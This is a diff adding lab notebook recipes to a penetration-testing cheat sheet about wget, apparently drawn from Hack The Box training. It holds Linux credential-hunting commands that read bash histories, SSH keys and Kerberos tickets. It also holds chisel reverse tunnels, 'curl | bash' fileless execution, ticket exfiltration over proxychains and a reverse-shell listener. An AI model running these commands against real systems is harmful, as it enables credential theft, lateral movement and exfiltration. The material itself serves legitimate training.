@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=wget) · [All tools](/index)
+
 ## Commands
 
 **Kali**
@@ -21,8 +23,339 @@ wget http://TARGET_IP:8000/file.zip -O file.zip
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=wget)
+## Notebook recipes
 
-## Learning and original examples
+20 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
+<AccordionGroup>
+
+<Accordion title="5. Credential hunting (Linux)">
+
+### 5. Credential hunting (Linux)
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+sudo -l                                               # #1 — instant win if misconfigured
+cat ~/.bash_history; cat /home/*/.bash_history 2>/dev/null
+history | grep -iE "ssh|mysql|psql|password|sshpass|curl|wget"
+ls -la ~/.ssh /home/*/.ssh 2>/dev/null                # keys to pivot with
+grep -riI "pass\|secret\|cred" /etc /opt /var/www /home 2>/dev/null | grep -v Binary
+# Kerberos artifacts (domain-joined Linux) -> Pass-the-Ticket:
+find / -name '*.keytab' 2>/dev/null; ls -la /etc/krb5.keytab 2>/dev/null
+ls -la /tmp/krb5cc_* 2>/dev/null; env | grep KRB5
+```
+
+</Accordion>
+
+<Accordion title="Option A — chisel + proxychains (SOCKS)">
+
+### Option A — chisel + proxychains (SOCKS)
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# Kali (attacker)
+./chisel server -p 9001 --reverse
+# DMZ01 (pull binary via your http server first)
+wget http://<KALI>:8080/chisel -O /tmp/chisel && chmod +x /tmp/chisel
+/tmp/chisel client <KALI>:9001 R:1080:socks
+# Kali: /etc/proxychains4.conf  ->  socks5 127.0.0.1 1080
+proxychains nxc smb 172.16.119.11 -u user -p pass
+```
+
+</Accordion>
+
+<Accordion title="Scrapy — ReconSpider">
+
+### Scrapy — ReconSpider
+
+**DNS and Web Reconnaissance: Full Workflow**
+
+```bash
+# Download and run the HTB ReconSpider
+wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
+unzip ReconSpider.zip
+python3 ReconSpider.py http://<target>
+```
+
+</Accordion>
+
+<Accordion title="Enumeration workflow">
+
+### Enumeration workflow
+
+**FTP Enumeration and File Access**
+
+```bash
+wget -r ftp://anonymous:anonymous@<IP>/        # recursively mirror the whole server
+```
+
+</Accordion>
+
+<Accordion title="Quick Decision Tree">
+
+### Quick Decision Tree
+
+**File Transfers for Linux and Windows**
+
+```text
+DOWNLOADING TO WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
+├── Only cmd.exe?       → certutil or bitsadmin
+├── Internal network?   → SMB (impacket-smbserver)
+├── Need fileless?      → IEX + DownloadString
+└── Nothing works?      → Base64 encode/decode via clipboard
+
+DOWNLOADING TO LINUX:
+├── Have curl/wget?     → Use them (simplest)
+├── Need fileless?      → curl | bash  or  wget -qO- | python3
+├── Have Python/PHP?    → Use language one-liners
+├── Nothing available?  → /dev/tcp bash trick
+└── Need encryption?    → OpenSSL s_server/s_client
+
+UPLOADING FROM WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
+├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
+├── Internal network?   → SMB or WebDAV
+└── Nothing works?      → Base64 encode → copy-paste → decode on attacker
+
+UPLOADING FROM LINUX:
+├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
+├── Have SCP?           → scp file user@attacker:/path/
+├── Have Python?        → python3 requests.post one-liner
+└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
+```
+
+</Accordion>
+
+<Accordion title="wget and cURL">
+
+### wget and cURL
+
+**File Transfers for Linux and Windows**
+
+```bash
+wget http://<IP>:<PORT>/file.sh -O /tmp/file.sh       # -O sets output filename
+curl -o /tmp/file.sh http://<IP>:<PORT>/file.sh        # -o (lowercase) sets output filename
+```
+
+**File Transfers for Linux and Windows**
+
+```bash
+curl http://<IP>/LinEnum.sh | bash                      # download and execute without saving
+wget -qO- http://<IP>/helloworld.py | python3           # -q = quiet, -O- = output to stdout
+```
+
+</Accordion>
+
+<Accordion title="Enumeration (post-foothold)">
+
+### Enumeration (post-foothold)
+
+**HTB Nibbles: Walkthrough and Report**
+
+```bash
+# Attacker
+python3 -m http.server 8080
+
+# Target
+wget http://10.10.14.174:8080/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+</Accordion>
+
+<Accordion title="6. Networking / pentest quick commands">
+
+### 6. Networking / pentest quick commands
+
+**Kali Terminal, tmux, zsh, and Vim**
+
+```bash
+ip a                # show interfaces & IPs (replaces ifconfig)
+ip a show tun0      # just the VPN interface (HTB/CPTS uses tun0)
+ip route            # routing table
+ss -tulpn           # listening ports (replaces netstat)
+ping -c 4 10.10.10.10
+curl -s http://target/ | less       # fetch a page
+curl -I http://target/               # headers only
+wget http://target/file              # download a file
+nc -lvnp 4444       # netcat listener (catch reverse shells)
+python3 -m http.server 80            # quick web server to transfer files
+```
+
+</Accordion>
+
+<Accordion title="Tools">
+
+### Tools
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh
+curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -o linpeas.sh
+./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete.
+./linpeas.sh -s #superfast & stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.
+./linpeas.sh -P #Password - Pass a password that will be used with sudo -l and bruteforcing other users
+```
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
+curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -o lse.sh
+./lse.sh -l1 # shows interesting information that should help you to privesc
+./lse.sh -l2 # dump all the information it gathers about the system
+```
+
+</Accordion>
+
+<Accordion title="Linikatz">
+
+### Linikatz
+
+**Pass the Ticket from Linux**
+
+```bash
+wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+chmod +x linikatz.sh
+```
+
+</Accordion>
+
+<Accordion title="Step 5 — Transfer the ticket from LINUX01 to Kali">
+
+### Step 5 — Transfer the ticket from LINUX01 to Kali
+
+**Pass the Ticket from Linux**
+
+```bash
+# [ON KALI] pull it THROUGH the tunnel (note proxychains + the internal IP)
+proxychains wget http://172.16.1.15:8080/krb5cc_647401106_8Dt6uj
+```
+
+**Pass the Ticket from Linux**
+
+Context from the notebook: Port mismatch:  the  python3 -m http.server &lt;port>  and the  wget `http://...:<port>`  must use the  same  port.
+
+```text
+wget http://...:<port>
+```
+
+</Accordion>
+
+<Accordion title="Downloading TO a Linux target">
+
+### Downloading TO a Linux target
+
+**Pivoting and File Transfer: Field Reference**
+
+```bash
+wget http://<reachable>:8080/tool -O /tmp/tool && chmod +x /tmp/tool
+curl http://<reachable>:8080/tool -o /tmp/tool
+# recursive (a whole dir): wget -r -np -nH --cut-dirs=1 -R "index.html*" http://<reachable>:8080/Linux/
+scp tool jbetty@<DMZ_IP>:/tmp/          # if you have SSH
+```
+
+</Accordion>
+
+<Accordion title="Mental Model — &quot;What Do I Use When?&quot;">
+
+### Mental Model — "What Do I Use When?"
+
+**Ports, Protocols, and Services by Purpose**
+
+```text
+"I found an open port"
+├── Is it a file share?    → SMB (445), NFS (2049), FTP (21)
+├── Is it remote access?   → SSH (22), RDP (3389), WinRM (5985)
+├── Is it a web server?    → HTTP (80/443) → fingerprint → fuzz
+├── Is it email?           → SMTP (25), IMAP (143), POP3 (110)
+├── Is it a database?      → MySQL (3306), MSSQL (1433), Oracle (1521)
+├── Is it monitoring?      → SNMP (161), IPMI (623)
+└── Not sure?              → nmap -sV -sC <IP> -p <port>
+
+"I need to get files off the target"
+├── Linux → scp/sftp (22)
+├── Windows → SMB (445) or evil-winrm download
+├── Web → wget/curl
+└── Simple → python3 -m http.server (on target)
+
+"I need to get files onto the target"
+├── Linux → scp/sftp (22) or wget from attacker
+├── Windows → SMB, certutil, PowerShell wget
+├── Web upload → if upload form exists
+└── Simple → python3 -m http.server (on attacker)
+
+"I need a shell"
+├── Linux → SSH (22)
+├── Windows → Evil-WinRM (5985), PsExec (445), RDP (3389)
+└── Either → reverse shell via exploit
+```
+
+</Accordion>
+
+<Accordion title="Quick Decision">
+
+### Quick Decision
+
+**Ports, Protocols, and Services by Purpose**
+
+```text
+Windows target → SMB (445)
+Linux target   → SCP/SFTP (22) or NFS (2049)
+No auth needed → FTP anonymous or TFTP
+Web server     → wget / curl
+```
+
+</Accordion>
+
+<Accordion title="Quick-start command cheat (run first, always)">
+
+### Quick-start command cheat (run first, always)
+
+**Privilege Escalation: Choose a Checklist**
+
+```bash
+# 1. Automated
+wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas.out
+
+# 2. Manual "big 6"
+id; sudo -l; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null; cat /etc/crontab; uname -a
+```
+
+</Accordion>
+
+<Accordion title="Quick Web Servers (Serve Files from Target)">
+
+### Quick Web Servers (Serve Files from Target)
+
+**File Transfers for Linux and Windows**
+
+Context from the notebook: Then from your attack box:  wget &lt;TARGET_IP>:8000/file.txt
+
+```text
+wget <TARGET_IP>:8000/file.txt
+```
+
+</Accordion>
+
+<Accordion title="Troubleshooting quick reference">
+
+### Troubleshooting quick reference
+
+**Pass the Ticket from Linux**
+
+Context from the notebook: wget  to internal IP hangs/refused Kali can't reach internal net directly; or server on wrong host Run  python3 -m http.server  on the box with the file (LINUX01);  proxychains wget  from Kali; match ports
+
+```text
+proxychains wget
+```
+
+</Accordion>
+
+</AccordionGroup>
